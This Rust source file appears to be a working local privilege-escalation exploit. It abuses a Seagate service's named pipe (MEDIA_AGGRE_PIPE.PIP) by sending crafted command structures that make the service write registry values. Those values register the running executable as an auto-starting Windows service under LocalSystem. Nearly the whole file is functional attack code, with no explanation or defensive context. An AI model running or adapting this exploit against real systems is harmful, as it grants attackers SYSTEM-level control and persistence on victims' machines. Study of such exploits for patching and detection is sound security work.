use std::error::Error;
use tokio::net::windows::named_pipe;

const PIPE_NAME: &str = r"\\.\pipe\\MEDIA_AGGRE_PIPE.PIP";

pub async fn set_registry_system_service(reg_key: &str) -> Result<(), Box<dyn Error>> {
    let reg_key_path: String = format!("SYSTEM\\CurrentControlSet\\Services\\{reg_key}");
    let current_exe: String = std::env::current_exe()?
        .into_os_string()
        .into_string()
        .expect("Failed current_exe into_string");
    let image_path: String = format!("\"C:\\Windows\\system32\\cmd.exe\" /c start \"\" \"{current_exe}\"");

    set_registry_data(
        MinorCommand::MXOSRVSET_REG_KEY,
        reg_key_path.as_str(),
        r"ImagePath",
        Some(image_path.as_str()),
        None,
    ).await?;

    set_registry_data(
        MinorCommand::MXOSRVSET_REG_KEY,
        reg_key_path.as_str(),
        r"ObjectName",
        Some(r"LocalSystem"),
        None,
    ).await?;

    set_registry_data(
        MinorCommand::MXOSRVSET_REG_DWORD,
        reg_key_path.as_str(),
        r"ErrorControl",
        None,
        Some(1),
    ).await?;

    set_registry_data(
        MinorCommand::MXOSRVSET_REG_DWORD,
        reg_key_path.as_str(),
        r"Start",
        None,
        Some(2),
    ).await?;

    set_registry_data(
        MinorCommand::MXOSRVSET_REG_DWORD,
        reg_key_path.as_str(),
        r"Type",
        None,
        Some(16),
    ).await?;

    Ok(())
}

async fn set_registry_data(
    minor_command: u32,
    reg_key_path: &str,
    reg_str_name: &str,
    reg_str_value: Option<&str>,
    reg_dword_value: Option<u32>,
) -> Result<(), Box<dyn Error>> {
    let client = named_pipe::ClientOptions::new().open(PIPE_NAME)?;

    // Stage 1: length of payload
    let payload_length: u32 = std::mem::size_of::<SeagateCommand>().try_into()?;
    let stage_1: [u8; 4] = payload_length.to_le_bytes();

    // Stage 2: payload
    let seagate_command = SeagateCommand::new(
        minor_command,
        reg_key_path,
        reg_str_name,
        reg_str_value,
        reg_dword_value,
    );
    let stage_2 = unsafe { any_as_u8_slice(&seagate_command) };

    // Check payload length
    assert!(stage_2.len() == 12_304);

    // Write both stages to named pipe
    write_to_named_pipe(&client, &stage_1).await?;
    write_to_named_pipe(&client, &stage_2).await?;

    Ok(())
}

async fn write_to_named_pipe(client: &named_pipe::NamedPipeClient, data: &[u8]) -> Result<(), Box<dyn Error>> {
    loop {
        // Wait for the pipe to be writable
        client.writable().await?;

        // Try to write data, this may still fail with `WouldBlock` if the readiness event is a false positive
        match client.try_write(data) {
            Ok(n) => {
                println!("bytes_written: {n}");
                break;
            }
            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                continue;
            }
            Err(e) => {
                return Err(e.into());
            }
        }
    }

    Ok(())
}

fn str_to_fixed_len_vec_u8(data: &str, len: usize) -> Vec<u8> {
    data
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes().to_vec())
        .chain(std::iter::repeat(0))
        .take(len)
        .collect()
}

unsafe fn any_as_u8_slice<T: Sized>(p: &T) -> &[u8] {
    std::slice::from_raw_parts(
        (p as *const T) as *const u8,
        std::mem::size_of::<T>(),
    )
}

struct MajorCommand {}
impl MajorCommand {
    const _0X10: u16 = 0x10;
}

struct MinorCommand {}
impl MinorCommand {
    const MXOSRVSET_REG_KEY: u32 = 0x400;
    const MXOSRVSET_REG_DWORD: u32 = 0x410;
}

#[repr(C, packed)]
struct SeagateCommand {
    _signature: [u8; 2],
    _major_command: [u8; 2],
    _minor_command: [u8; 4],
    _reg_key_path: [u8; 4096],
    _reg_str_name: [u8; 4096],
    _reg_str_value: [u8; 4096],
    _reg_str_value_length: [u8; 4],
    _reg_dword_value: [u8; 4],
}

impl SeagateCommand {
    const SIGNATURE: u16 = 0x4b5c;

    fn new(
        minor_command: u32,
        reg_key_path: &str,
        reg_str_name: &str,
        reg_str_value: Option<&str>,
        reg_dword_value: Option<u32>,
    ) -> Self {
        match minor_command {
            MinorCommand::MXOSRVSET_REG_KEY => SeagateCommand {
                _signature: Self::SIGNATURE.to_le_bytes(),
                _major_command: MajorCommand::_0X10.to_le_bytes(),
                _minor_command: minor_command.to_le_bytes(),
                _reg_key_path: str_to_fixed_len_vec_u8(reg_key_path, 4096).try_into().expect("reg_key_path"),
                _reg_str_name: str_to_fixed_len_vec_u8(reg_str_name, 4096).try_into().expect("reg_str_name"),
                _reg_str_value: str_to_fixed_len_vec_u8(&reg_str_value.expect("reg_str_value"), 4096)
                    .try_into()
                    .expect("reg_str_value"),
                _reg_str_value_length: ((reg_str_value.expect("reg_str_value").len() * 2) as u32).to_le_bytes(),
                _reg_dword_value: [0; 4],
            },
            MinorCommand::MXOSRVSET_REG_DWORD => SeagateCommand {
                _signature: Self::SIGNATURE.to_le_bytes(),
                _major_command: MajorCommand::_0X10.to_le_bytes(),
                _minor_command: minor_command.to_le_bytes(),
                _reg_key_path: str_to_fixed_len_vec_u8(reg_key_path, 4096).try_into().expect("Invalid reg_key_path"),
                _reg_str_name: str_to_fixed_len_vec_u8(reg_str_name, 4096).try_into().expect("Invalid reg_str_name"),
                _reg_str_value: [0; 4096],
                _reg_str_value_length: [0; 4],
                _reg_dword_value: reg_dword_value.expect("reg_dword_value").to_le_bytes(),
            },
            _ => panic!("Invalid minor_command"),
        }
    }
}
